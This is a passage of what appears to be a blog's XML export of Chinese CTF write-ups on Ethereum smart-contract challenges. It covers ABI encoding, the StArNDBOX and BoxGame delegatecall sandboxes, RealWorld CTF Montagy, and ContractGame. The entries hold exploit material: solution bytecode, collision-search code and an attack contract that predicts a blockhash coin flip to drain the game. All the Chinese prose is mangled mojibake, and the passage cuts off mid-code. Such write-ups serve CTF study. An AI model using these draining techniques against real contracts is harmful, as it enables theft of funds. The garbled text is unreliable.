ä¸ºæ¶‰åŠåˆ°å‡½æ•°å‚æ•°æ•´ä½“çš„ä¸€ä¸ªencodingä¸Šé¢å°±å·²ç»æŠŠæœ€åŽå°±æ˜¯[[1, 2], [3]]å’Œ[&quot;one&quot;, &quot;two&quot;, &quot;three&quot;]åˆ†æžå®Œæ¯•ï¼Œæœ€åŽå°±æ˜¯å…¶ä½œä¸ºä¸€ä¸ªæ•´ä½“è¿›è¡Œencoding0 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [[1, 2], [3]]1 - g // offset of [&quot;one&quot;, &quot;two&quot;, &quot;three&quot;]2 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [[1, 2], [3]]3 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [1, 2]4 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of [3]5 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [1, 2]6 - 0x0000000000000000000000000000000000000000000000000000000000000001 // encoding of 17 - 0x0000000000000000000000000000000000000000000000000000000000000002 // encoding of 28 - 0x0000000000000000000000000000000000000000000000000000000000000001 // count for [3]9 - 0x0000000000000000000000000000000000000000000000000000000000000003 // encoding of 310- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for [&quot;one&quot;, &quot;two&quot;, &quot;three&quot;]11- 0x0000000000000000000000000000000000000000000000000000000000000060 // offset for &quot;one&quot;12- 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset for &quot;two&quot;13- 0x00000000000000000000000000000000000000000000000000000000000000e0 // offset for &quot;three&quot;14- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for &quot;one&quot;15- 0x6f6e650000000000000000000000000000000000000000000000000000000000 // encoding of &quot;one&quot;16- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for &quot;two&quot;17- 0x74776f0000000000000000000000000000000000000000000000000000000000 // encoding of &quot;two&quot;18- 0x0000000000000000000000000000000000000000000000000000000000000005 // count for &quot;three&quot;19- 0x7468726565000000000000000000000000000000000000000000000000000000 // encoding of &quot;three&quot;gæŒ‡å‘å­—ç¬¦ä¸²æ•°ç»„çš„å¼€å§‹ï¼Œæ‰€ä»¥g=0x20*10=140æ‰€ä»¥æ€»çš„selector+encodingå¦‚ä¸‹æ‰€ç¤º0xcc80bc65 // function selector0 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [[1, 2], [3]]1 - 0x0000000000000000000000000000000000000000000000000000000000000140 // offset of [&quot;one&quot;, &quot;two&quot;, &quot;three&quot;]2 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [[1, 2], [3]]3 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [1, 2]4 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of [3]5 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [1, 2]6 - 0x0000000000000000000000000000000000000000000000000000000000000001 // encoding of 17 - 0x0000000000000000000000000000000000000000000000000000000000000002 // encoding of 28 - 0x0000000000000000000000000000000000000000000000000000000000000001 // count for [3]9 - 0x0000000000000000000000000000000000000000000000000000000000000003 // encoding of 310- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for [&quot;one&quot;, &quot;two&quot;, &quot;three&quot;]11- 0x0000000000000000000000000000000000000000000000000000000000000060 // offset for &quot;one&quot;12- 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset for &quot;two&quot;13- 0x00000000000000000000000000000000000000000000000000000000000000e0 // offset for &quot;three&quot;14- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for &quot;one&quot;15- 0x6f6e650000000000000000000000000000000000000000000000000000000000 // encoding of &quot;one&quot;16- 0x0000000000000000000000000000000000000000000000000000000000000003 // count for &quot;two&quot;17- 0x74776f0000000000000000000000000000000000000000000000000000000000 // encoding of &quot;two&quot;18- 0x0000000000000000000000000000000000000000000000000000000000000005 // count for &quot;three&quot;19- 0x7468726565000000000000000000000000000000000000000000000000000000 // encoding of &quot;three&quot;]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Solidity</tag>
        <tag>Function Selector</tag>
        <tag>Argument Encoding</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ðŸŒŸctf 2021 åŒºå—é“¾ StArNDBOX]]></title>
    <url>%2F2021%2F6-ctf2021%2F</url>
    <content type="text"><![CDATA[å‰è¨€ ðŸŒŸðŸŒŸðŸŒŸðŸŒŸðŸŒŸðŸŒŸæˆ˜é˜Ÿç»„ç»‡çš„æ¯”èµ›ï¼Œå…¶ä¸­æœ‰ä¸€é“åŒºå—é“¾é¢˜ç›®ï¼Œå°±èŠ±äº†ä¼šæ—¶é—´çœ‹çœ‹ Source123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133pragma solidity ^0.5.11;library Math &#123; function invMod(int256 _x, int256 _pp) internal pure returns (int) &#123; int u3 = _x; int v3 = _pp; int u1 = 1; int v1 = 0; int q = 0; while (v3 &gt; 0)&#123; q = u3/v3; u1= v1; v1 = u1 - v1*q; u3 = v3; v3 = u3 - v3*q; &#125; while (u1&lt;0)&#123; u1 += _pp; &#125; return u1; &#125; function expMod(int base, int pow,int mod) internal pure returns (int res)&#123; res = 1; if(mod &gt; 0)&#123; base = base % mod; for (; pow != 0; pow &gt;&gt;= 1) &#123; if (pow &amp; 1 == 1) &#123; res = (base * res) % mod; &#125; base = (base * base) % mod; &#125; &#125; return res; &#125; function pow_mod(int base, int pow, int mod) internal pure returns (int res) &#123; if (pow &gt;= 0) &#123; return expMod(base,pow,mod); &#125; else &#123; int inv = invMod(base,mod); return expMod(inv,abs(pow),mod); &#125; &#125; function isPrime(int n) internal pure returns (bool) &#123; if (n == 2 ||n == 3 || n == 5) &#123; return true; &#125; else if (n % 2 ==0 &amp;&amp; n &gt; 1 )&#123; return false; &#125; else &#123; int d = n - 1; int s = 0; while (d &amp; 1 != 1 &amp;&amp; d != 0) &#123; d &gt;&gt;= 1; ++s; &#125; int a=2; int xPre; int j; int x = pow_mod(a, d, n); if (x == 1 || x == (n - 1)) &#123; return true; &#125; else &#123; for (j = 0; j &lt; s; ++j) &#123; xPre = x; x = pow_mod(x, 2, n); if (x == n-1)&#123; return true; &#125;else if(x == 1)&#123; return false; &#125; &#125; &#125; return false; &#125; &#125; function gcd(int a, int b) internal pure returns (int) &#123; int t = 0; if (a &lt; b) &#123; t = a; a = b; b = t; &#125; while (b != 0) &#123; t = b; b = a % b; a = t; &#125; return a; &#125; function abs(int num) internal pure returns (int) &#123; if (num &gt;= 0) &#123; return num; &#125; else &#123; return (0 - num); &#125; &#125; &#125;contract StArNDBOX&#123; using Math for int; constructor()public payable&#123; &#125; modifier StAr() &#123; require(msg.sender != tx.origin); _; &#125; function StArNDBoX(address _addr) public payable&#123; uint256 size; bytes memory code; int res; assembly&#123; size := extcodesize(_addr) code := mload(0x40) mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f)))) mstore(code, size) extcodecopy(_addr, add(code, 0x20), 0, size) &#125; for(uint256 i = 0; i &lt; code.length; i++) &#123; res = int(uint8(code[i])); require(res.isPrime() == true); &#125; bool success; bytes memory _; (success, _) = _addr.delegatecall(&quot;&quot;); require(success); &#125;&#125; æ²™ç®±æ¸¸æˆï¼Œç›®çš„æ˜¯æ¸…ç©ºåˆçº¦ä½™é¢ï¼Œbytecode æ¯ä¸€ä¸ªå­—èŠ‚å¿…é¡»å…¨ä¸ºè´¨æ•°ï¼Œæ¯”è¾ƒç®€å•ï¼Œç›´æŽ¥æŒ‰ç…§ä¸‹å›¾éƒ¨ç½² call çš„å‚æ•°ï¼Œç„¶åŽä½¿ value ä¸º 0x64 å³å¯ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œpush çš„æ—¶å€™é‡åˆ°ä¸æ˜¯è´¨æ•°çš„æƒ…å†µï¼Œé€šè¿‡åŠ å‡æˆ–è€…ä½¿ç”¨ 0x61 è¡¥ 0 å³å¯ï¼Œéƒ¨ç½²ä¸€ä¸ªä¸‹é¢çš„ bytecode å³å¯ 12345678910111213140x6100016100016100016100016100016100650361000161fbfbf1/*PUSH2 0x0001PUSH2 0x0001PUSH2 0x0001PUSH2 0x0001PUSH2 0x0001PUSH2 0x0065SUBPUSH2 0x0001PUSH2 0xfbfbCALL*/]]></content>
      <categories>
        <category>ðŸŒŸctf2021</category>
      </categories>
      <tags>
        <tag>ðŸŒŸctf2021</tag>
        <tag>Blockchain</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç¬¬ä¸‰å±Šrealworld åŒºå—é“¾wp]]></title>
    <url>%2F2021%2Frw2021%2F</url>
    <content type="text"><![CDATA[å‰è¨€ ç¬¬ä¸‰å±Š realworld, blockchains çš„ WP æ€»å…±æœ‰ä¸‰é¢˜ï¼Œé˜Ÿä¼æ€»å…±åšå‡ºä¸¤é“ï¼ŒåŽç»­ä¼šæŒç»­æ›´æ–° éšæ—¶æ¬¢è¿Žå¤§å®¶äº¤æµï¼Œéšä¾¿å†™å†™ ç‚¹å‡»è¿™é‡Œ -&gt; é¢˜ç›®é™„ä»¶ Montagy é¢˜ç›®ç›®æ ‡æ¸…ç©ºä½™é¢ å’Œé˜Ÿå‹ä¸€èµ·åšå‡ºæ¥çš„é¢˜ç›®ï¼Œåº”è¯¥æ˜¯éžé¢„æœŸåšå‡ºæ¥çš„ï¼Œè¿™é‡Œä¼šå°†æˆ‘ä»¬çš„è§£æ³•å’Œé¢„æœŸè§£æ³•éƒ½ç¨å¾®å†™ä¸€ä¸‹ éžé¢„æœŸè§£æ³• æˆ‘ä»¬åšå‡ºæ¥çš„é¢˜ç›®åœ°å€ https://rinkeby.etherscan.io/address/0x8095e742cFeAFf77b92BdE56951388a6585E98d5 éžé¢„æœŸæ€æƒ³å°±æ˜¯ç¢°æ’žï¼Œç¢°æ’žä»£ç æ¥è‡ªäºŽ liangjs å¸ˆå‚… 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106#include &lt;cstdio&gt;#include &lt;ctime&gt;#include &lt;cstdint&gt;#include &lt;cstdlib&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;using namespace std;uint64_t forw(uint32_t t1, uint32_t t2, uint32_t m1, uint32_t m2, uint32_t m3, uint32_t m4)&#123; uint32_t p1, p2, p3; uint32_t s = 0x6644498b; for (int i = 0; i &lt; 16; ++i) &#123; s = s + 0x68696e74; p1 = (t1&lt;&lt;4) - m1; p2 = t1 + s; p3 = (t1&gt;&gt;5) + m2; t2 = t2 + (p1^(p2^p3)); p1 = (t2&lt;&lt;4) + m3; p2 = t2 + s; p3 = (t2&gt;&gt;5) - m4; t1 = t1 + (p1^(p2^p3)); &#125; return ((uint64_t)t1 &lt;&lt; 32) | t2;&#125;uint64_t back(uint32_t t1, uint32_t t2, uint32_t m1, uint32_t m2, uint32_t m3, uint32_t m4)&#123; uint32_t p1, p2, p3; uint32_t s = (0x6644498b+0x68696e74ull*16) &amp; 0xffffffff; for (int i = 0; i &lt; 16; ++i) &#123; p1 = (t2&lt;&lt;4) + m3; p2 = t2 + s; p3 = (t2&gt;&gt;5) - m4; t1 = t1 - (p1^(p2^p3)); p1 = (t1&lt;&lt;4) - m1; p2 = t1 + s; p3 = (t1&gt;&gt;5) + m2; t2 = t2 - (p1^(p2^p3)); s = s - 0x68696e74; &#125; return ((uint64_t)t1 &lt;&lt; 32) | t2;&#125;int main()&#123; srand(time(0)); vector&lt;uint64_t&gt; data; data.reserve(1ull&lt;&lt;31); uint32_t tb1 = 443551905, tb2 = 186746487; uint32_t te1 = 1418013151, te2 = 3531071330; for (uint64_t i = 0; i &lt; (1ull&lt;&lt;31); ++i) &#123; uint64_t v = forw(tb1, tb2, 0, 0, 0, i); data.push_back(v); if (i % 10000000 == 0) printf(&quot;i=%ld\n&quot;,i); &#125; printf(&quot;sort\n&quot;); sort(data.begin(), data.end()); printf(&quot;unique\n&quot;); data.erase(unique(data.begin(), data.end()), data.end()); uint64_t gv = 0; for (uint64_t m3 = 0;; ++m3) &#123; vector&lt;uint64_t&gt; data2; data2.reserve(1ull&lt;&lt;30); for (uint64_t m4 = 0; m4 &lt; (1ull&lt;&lt;30); ++m4) &#123; uint64_t v = back(te1, te2, 0, 0, m3, m4); data2.push_back(v); if (m4 % 10000000 == 0) printf(&quot;i=%ld\n&quot;, m4); &#125; printf(&quot;sort\n&quot;); sort(data2.begin(), data2.end()); uint64_t i = 0, j = 0; while (i &lt; data.size() &amp;&amp; j &lt; data2.size()) &#123; if (data[i] == data2[j]) &#123; gv = data[i]; break; &#125; else if (data[i] &lt; data2[j]) ++i; else ++j; &#125; if (gv != 0) &#123; printf(&quot;gv=%lx\n&quot;, gv); printf(&quot;m3=%lx\n&quot;, m3); for (uint64_t m4 = 0; m4 &lt; (1ull&lt;&lt;30); ++m4) &#123; uint64_t v = back(te1, te2, 0, 0, m3, m4); if (v == gv) &#123; printf(&quot;m4=%lx\n&quot;, m4); break; &#125; &#125; break; &#125; &#125; for (uint64_t i = 0; i &lt; (1ull&lt;&lt;31); ++i) &#123; uint64_t v = forw(tb1, tb2, 0, 0, 0, i); if (v == gv) &#123; printf(&quot;m4=%lx\n&quot;, i); break; &#125; &#125; return 0;&#125; è¿™æ˜¯æˆ‘ä»¬éƒ¨ç½²çš„ newPuzzle ï¼Œæˆ‘ä»¬æ˜¯ç›´æŽ¥æ”¹çš„é¢˜ç›®ä¸­çš„ newPuzzle ï¼ŒæŠŠ 0x403 å­—èŠ‚ä½ç½®çš„ 0x14ï¼ˆç­‰äºŽï¼‰ æ”¹ä¸ºäº† 0x10ï¼ˆå°äºŽï¼‰ï¼Œè¿™æ ·éšä¾¿æ‰¾ä¸€ä¸ª seed æ»¡è¶³æ¡ä»¶å³å¯ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç›´æŽ¥å†™ä¸€ä¸ªæ”»å‡»åˆçº¦è°ƒç”¨é¢˜ç›®çš„ solve ä¹Ÿè¡Œï¼ˆå¡«å……åˆ°æŒ‡å®šå­—èŠ‚ï¼Œç„¶åŽç¢°æ’žä¹Ÿå¯ä»¥ï¼‰ 10x608060405234801561001057600080fd5b50336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610542806100606000396000f3fe608060405234801561001057600080fd5b506004361061004c5760003560e01c806304f77cfa146100515780634059e88714610073578063fd922a42146101c5578063ffa644851461020f575b600080fd5b61005961028e565b604051808215151515815260200191505060405180910390f35b6101c36004803603604081101561008957600080fd5b81019080803590602001906401000000008111156100a657600080fd5b8201836020820111156100b857600080fd5b803590602001918460018302840111640100000000831117156100da57600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600081840152601f19601f8201169050808301925050505050505091929192908035906020019064010000000081111561013d57600080fd5b82018360208201111561014f57600080fd5b8035906020019184600183028401116401000000008311171561017157600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600081840152601f19601f820116905080830192505050505050509192919290505050610362565b005b6101cd61049e565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b61028c600480360361012081101561022657600080fd5b810190808035906020019092919080359060200190929190803590602001909291908035906020019092919080359060200190929190803590602001909291908035906020019092919080359060200190929190803590602001909291905050506104c3565b005b6000806009546008546007541818600654600554600454181860035460025460015418180101905060006009546006546003540101600854600554600254010160075460045460015401011818905063aabbccdd818301106102ef57600080fd5b708261e26b90505061031256e5afb60721cb821161030c57600080fd5b8082027ef35b6080614321368282376084810151606401816080016143855161051756101561033a57600080fd5b6f65e670d9bd540cea22fdab97e36840e2818303101561035957600080fd5b60019250505090565b61036a61028e565b61037357600080fd5b716111d850336107ef16565b908018915a905660701b6dffffffffffffffffffffffffffff19168280519060200120101561049a576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166376fe1e92826040518263ffffffff1660e01b81526004018080602001828103825283818151815260200191508051906020019080838360005b8381101561043557808201518184015260208101905061041a565b50505050905090810190601f1680156104625780820380516001836020036101000a031916815260200191505b5092505050600060405180830381600087803b15801561048157600080fd5b505af1158015610495573d6000803e3d6000fd5b505050505b5050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b88600181905550876002819055508660038190555085600481905550846005819055508360068190555082600781905550816008819055508060098190555050505050505050505056fea265627a7a723158205b60025b80600514615676d5110000000000000000000000001230212a0000000100000000000000000032 å› ä¸ºæˆ‘ä»¬æ˜¯ç›´æŽ¥æ”¹çš„é¢˜ç›®ä¸­çš„ puzzle ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç»•è¿‡ loose ï¼Œè¿™é‡Œæ˜¯ 1ph0n å¸ˆå‚…æä¾›çš„ 123456789101112131415161718192021222324252627282930313233343536# loose() writeupfor a in range(1, 16): for b in range(1, 16): for c in range(1, 16): if a + b + c == 7 and a ^ b ^ c == 3: print(a, b, c) # output:# 2 2 3 # 2 3 2 # 3 2 2# match them to:# a b c# d e f# g h ia = 0x2000000000000000000000000000000000000000000000000000000000000000b = 0x2000000000000000000000000000000000000000000000000000000000000000c = 0x3000000000000000000000000000000000000000000000000000000000000000d = 0x2000000000000000000000000000000000000000000000000000000000000000e = 0x3000000000000000000000000000000000000000000000000000000000000000f = 0x2000000000000000000000000000000000000000000000000000000000000000g = 0x3000000000000000000000000000000000000000000000000000000000000000h = 0x2000000000000000000000000000000000000000000000000000000000000000i = 0x2000000000000000000000000000000000000000000000000000000000000000# test: t1 = (a^b^c)+(d^e^f)+(g^h^i)t2 = (a+d+g)^(b+e+h)^(c+f+i)print(hex(t1))print(hex(t2))print((t1 + t2) % 0x10000000000000000000000000000000000000000000000000000000000000000 &lt; 0xaabbccdd )print(t1 &gt; 0x8261e26b90505061031256e5afb60721cb)print(0xf35b6080614321368282376084810151606401816080016143855161051756 &gt;= (t1*t2) % 0x10000000000000000000000000000000000000000000000000000000000000000)print(t1 - t2 &gt;= 0x65e670d9bd540cea22fdab97e36840e2) ç„¶åŽå°±å¯ä»¥æ‰¾ä¸€ä¸ª seed ç¬¦åˆæˆ‘ä»¬æ”¹è¿‡ä¹‹åŽçš„æ¡ä»¶ï¼ˆæ¡ä»¶æ”¹ä¸ºäº†å°äºŽï¼‰å°±è¡Œå•¦ é¡ºä¾¿è¿™é‡Œæ’å˜´ä¸€å¥ï¼Œç”±äºŽæˆ‘æ‹¥æœ‰å¼ºå¤§çš„æš—é»‘ä¹‹åŠ›ï¼ŒðŸ¤“æˆ‘æ‰¾åˆ°äº†æ‰€æœ‰é˜Ÿä¼åšè¿™é“é¢˜ç›®çš„åœ°å€ï¼Œå¼å¼å“ˆå˜¿ï¼Œå¿«å¤¸æˆ‘ðŸ¶ï¼ˆåªæ ‡æ³¨äº†ä¸€äº›é˜Ÿä¼ï¼‰ 12345678910111213141516170x05751749a85D2149C76BC035af4826208Dd9118b AAA0x0F4f4c78cE13b69239A676fE65C72bf974b3fCa30x6D2BD358b7788E27C271eFE4d40b7A82F6E6c7830x6BA08F6731509c63026Bc431023F35e49fF4f8fC0x8FA83b9e152120F11c13d678c7879C3eC2f14DB70xA54c712054dEDD5587B5c39F1DF0Aab8BD782B630xC66005B6295f396b4289219486aC62aCFC0Ff4d40xbc16Cf28E491Ae88C36638642e7673Af4570A1e40x3E8C7FEc0166bd59Ca1FcD0672bF8E3915c56Bdf0x4E8d7823046b3CE7eBd99F7282B18c3DaDD879ED0x44cE28ad66C38dD334C518EA6f07248a1B3EA08C0x6B217cbB59e6d0edb104D815db749436708434630x60a05Ada89061221e1602957097248FC8c373fE4 0ops0xDA93b922A68d42Edd7E377f4E06fD574A70B61230x726a02a9176e8E458CE8bD75305B92e72a8b4eA2 Sauercloud0x00E457CD4A251d58D9Af7F674857c78a6Dc73e8F0x11674249BdC62045947e3022808B6dfD009573B6 é¢„æœŸè§£æ³• é¢„æœŸè§£æ³•åº”è¯¥æ˜¯æ¯”ç‰¹ç¿»è½¬ï¼ˆè¿™æ˜¯ tag ä¸­å˜å½¢ tea ç®—æ³•çš„ç‰¹æ€§ï¼‰ï¼Œè¿™ä¸ªåœ¨æ¯”èµ›ä¸­ä¹Ÿå‘çŽ°äº†ï¼Œä¸è¿‡é˜Ÿå‹éƒ½ç¢°æ’žå‡ºäº†ï¼Œå°±æ²¡æœ‰ç»§ç»­å‘ä¸‹çœ‹ï¼Œå…¨åœºé˜Ÿä¼åº”è¯¥åªæœ‰ 0ops æ˜¯é¢„æœŸè§£ï¼Œå®ƒä»¬çš„åœ°å€æ˜¯ https://rinkeby.etherscan.io/address/0x60a05ada89061221e1602957097248fc8c373fe4 æ”¹åŠ¨ 6 bitï¼Œå…·ä½“è‡ªè¡Œåˆ†æžï¼Œæˆ–è€…ä¹Ÿå¯ä»¥ç­‰å®˜æ–¹é¦–å¸­çš„ WPï¼Œä¸æƒ³åˆ†æžäº†23333ï¼Œæ‡’ç™Œæ‚£è€…ï¼Œç­‰å®˜æ–¹ WP å…¬å¸ƒä¹‹åŽä¼šæ¬è¿è¿‡æ¥ï¼Œæˆ‘åªæ˜¯ä¸ªæ¬è¿å·¥5555 é¦–å¸­å…¬å¼€äº†æºç  https://github.com/xhyumiracle/rwctf3rd-Re-Montagy, WP è§ https://github.com/0ops/ctfs-2021/tree/main/RealWorldCTF/Re_Montagy EasyDefi è¿™æ˜¯ sissel å¸ˆå‚…åšå‡ºæ¥çš„é¢˜ç›®ï¼Œçœ‹çœ‹å¸ˆå‚…ä¼šä¸ä¼šæ”¾ wp å•¦ï¼Œæˆ‘å°±å…ˆä¸å†™å•¦ æ‰¾åˆ°ä¸€ä»½ syang å¸ˆå‚…çš„ ðŸ‘‰ wp ðŸ‘ˆ billboard æœªè§£å‡ºï¼Œè™½ç„¶èµ›åŽå’¨è¯¢äº†å‡ºé¢˜äººæ­£ç¡®è§£æ³•ï¼ŒçŸ¥é“äº†å¤§æ¦‚åŽŸå› ï¼Œä½†è¿˜æ˜¯å‡†å¤‡ç­‰å¾…å®˜æ–¹ WP åŽå†æ›´æ–° ðŸ‘‰ å®˜æ–¹WP ðŸ‘ˆ æ¥å•¦ ðŸ¤“ ä¸‹é¢æ˜¯æœ¬åœ°å¤çŽ°æˆåŠŸçš„ç»“æžœï¼Œå¤ªæ„Ÿè°¢ iczc å¸ˆå‚…äº†]]></content>
      <categories>
        <category>realworld2021</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>realworld2021</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[åŽä¸ºé¸¿è’™åœºåŒºå—é“¾ ContractGame]]></title>
    <url>%2F2020%2Fcontractgame%2F</url>
    <content type="text"><![CDATA[å‰è¨€ åŽä¸ºé¸¿è’™åœºåŒºå—é“¾é¢˜ç›® æ°´é¢˜ï¼Œæˆ‘ Ver å–·çš„é¢˜éƒ½æ˜¯æ°´é¢˜ Source123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112pragma solidity ^0.4.23;contract ContractGame &#123; event SendFlag(address addr); mapping(address =&gt; bool) internal authPlayer; uint private blocknumber; uint private gameFunds; uint private cost; bool private gameStopped = false; address public owner; bytes4 private winningTicket; uint randomNumber = 0; mapping(address=&gt;bool) private potentialWinner; mapping(address=&gt;uint256) private rewards; mapping(address=&gt;bytes4) private ticketNumbers; constructor() public payable &#123; gameFunds = add(gameFunds, msg.value); cost = div(gameFunds, 10); owner = msg.sender; rewards[address(this)] = msg.value; &#125; modifier auth() &#123; require(authPlayer[msg.sender], &quot;you are not authorized!&quot;); _; &#125; function add(uint256 a, uint256 b) internal pure returns (uint256) &#123; uint256 c = a + b; require(c &gt;= a, &quot;SafeMath: addition overflow&quot;); return c; &#125; function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123; require(b &lt;= a); uint256 c = a - b; return c; &#125; function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123; if (a == 0) &#123; return 0; &#125; uint256 c = a * b; require(c / a == b, &quot;SafeMath: multiplication overflow&quot;); return c; &#125; function div(uint256 a, uint256 b) internal pure returns (uint256) &#123; require(b &gt; 0); uint256 c = a / b; return c; &#125; function BetGame(bool mark) external payable &#123; require(msg.value == cost); require(gameFunds &gt;= div(cost, 2)); bytes32 entropy = blockhash(block.number-1); bytes1 coinFlip = entropy[10] &amp; 1; if ((coinFlip == 1 &amp;&amp; mark) || (coinFlip == 0 &amp;&amp; !mark)) &#123; gameFunds = sub(gameFunds, div(msg.value, 2)); msg.sender.transfer(div(mul(msg.value, 3), 2)); &#125; else &#123; gameFunds = add(gameFunds, msg.value); &#125; if (address(this).balance==0) &#123; winningTicket = bytes4(0); blocknumber = block.number + 1; gameStopped = false; potentialWinner[msg.sender] = true; rewards[msg.sender] += msg.value; ticketNumbers[msg.sender] = bytes4((msg.value - cost)/10**8); &#125; &#125; function closeGame() external auth &#123; require(!gameStopped); require(blocknumber != 0); require(winningTicket == bytes4(0)); require(block.number &gt; blocknumber); require(msg.sender == owner || rewards[msg.sender] &gt; 0); winningTicket = bytes4(blockhash(blocknumber)); potentialWinner[msg.sender] = false; gameStopped = true; &#125; function winGame() external auth &#123; require(gameStopped); require(potentialWinner[msg.sender]); if(winningTicket == ticketNumbers[msg.sender])&#123; emit SendFlag(msg.sender); &#125; selfdestruct(msg.sender); &#125; function AddAuth(address addr) external &#123; authPlayer[addr] = true; &#125; function() public payable auth&#123; if(msg.value == 0) &#123; this.closeGame(); &#125; else &#123; this.winGame(); &#125; &#125;&#125; Analyse é¢˜ç›®é€†å‘ä¸éš¾ï¼Œä½†æ˜¯è¾ƒä¸ºå¤æ‚ï¼Œä¸Šé¢æ˜¯æºç  è€ƒç‚¹æœ‰ä¸‰ä¸ªï¼š è€ƒå¯Ÿå¯¹åŠ¨æ€æ•°ç»„ã€mapç±»åž‹æ•°æ®çš„å­˜å‚¨è§„åˆ™è®¡ç®— è€ƒå¯Ÿ blockhash è€ƒå¯Ÿ fallback åŠ msg.sender çš„ç†è§£ Exp12345678910111213141516171819202122232425262728contract hack &#123; ContractGame target = ContractGame(é¢˜ç›®åœ°å€); // first: call pwn with 2 ether function pwn() payable public &#123; bytes32 entropy = block.blockhash(block.number-1); bytes1 coinFlip = entropy[10] &amp; 1; for(int i=0;i&lt;20;i++)&#123; if (coinFlip == 1)&#123; target.BetGame.value(100000000000000000)(true); &#125; else &#123; target.BetGame.value(100000000000000000)(false); &#125; &#125; &#125; // second: call AddAuth(é¢˜ç›®åˆçº¦åœ°å€) // third: call AddAuth(å¤–éƒ¨è´¦æˆ·åœ°å€) // forth: call AddAuth(æ”»å‡»åˆçº¦åœ°å€) // fifth: after 256 blocks then call fallbackï¼ˆå¯ä»¥é€šè¿‡å¤–éƒ¨è´¦æˆ·ç›´æŽ¥è½¬è´¦msg.value=0å³å¯ï¼Œç„¶åŽä¼šè°ƒç”¨closeGameå‡½æ•°ï¼‰ // sixth: call winGame() function winGame() public &#123; target.winGame(); &#125; function() payable &#123;&#125;&#125; å…·ä½“è¿‡ç¨‹éƒ½åœ¨ä¸Šé¢ exp çš„æ³¨é‡Šé‡Œé¢ æŒ‰ç…§ first åˆ° sixth çš„é¡ºåºæ‰§è¡Œå³å¯]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Smart Contract</tag>
        <tag>åŽä¸ºé¸¿è’™åœº ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[åŽä¸ºé²²é¹è®¡ç®—åœºåŒºå—é“¾ boxgame]]></title>
    <url>%2F2020%2Fboxgame%2F</url>
    <content type="text"><![CDATA[å‰è¨€ åŽä¸ºé²²é¹è®¡ç®—åœºåŒºå—é“¾é¢˜ç›® ä¸€ä¸ªæ²™ç®±æ¸¸æˆï¼Œæ¯”è¾ƒç®€å• Source é¢˜ç›®åˆçº¦å¦‚ä¸‹æ‰€ç¤º 12345678910111213141516171819202122232425262728293031323334pragma solidity ^0.5.10;contract BoxGame &#123; event ForFlag(address addr); address public target; constructor(bytes memory a) payable public &#123; assembly &#123; return(add(0x20, a), mload(a)) &#125; &#125; function check(address _addr) public &#123; uint size; assembly &#123; size := extcodesize(_addr) &#125; require(size &gt; 0 &amp;&amp; size &lt;= 4); target = _addr; &#125; function payforflag(address payable _addr) public &#123; require(_addr != address(0)); target.delegatecall(abi.encodeWithSignature(&quot;&quot;)); selfdestruct(_addr); &#125; function sendFlag() public payable &#123; require(msg.value &gt;= 1000000000 ether); emit ForFlag(msg.sender); &#125;&#125; æž„é€ å‡½æ•°ä¸­çš„çœŸå®žåˆçº¦å¦‚ä¸‹ 1234567891011121314151617181920212223242526272829303132333435363738394041pragma solidity ^0.5.10;contract BoxGame &#123; event ForFlag(address addr); address public target; function payforflag(address payable _addr) public &#123; require(_addr != address(0)); uint256 size; bytes memory code; assembly &#123; size := extcodesize(_addr) code := mload(0x40) mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f)))) mstore(code, size) extcodecopy(_addr, add(code, 0x20), 0, size) &#125; for(uint256 i = 0; i &lt; code.length; i++) &#123; require(code[i] != 0xf0); // CREATE require(code[i] != 0xf1); // CALL require(code[i] != 0xf2); // CALLCODE require(code[i] != 0xf4); // DELEGATECALL require(code[i] != 0xfa); // STATICCALL require(code[i] != 0xff); // SELFDESTRUCT &#125; _addr.delegatecall(abi.encodeWithSignature(&quot;&quot;)); selfdestruct(_addr); &#125; function 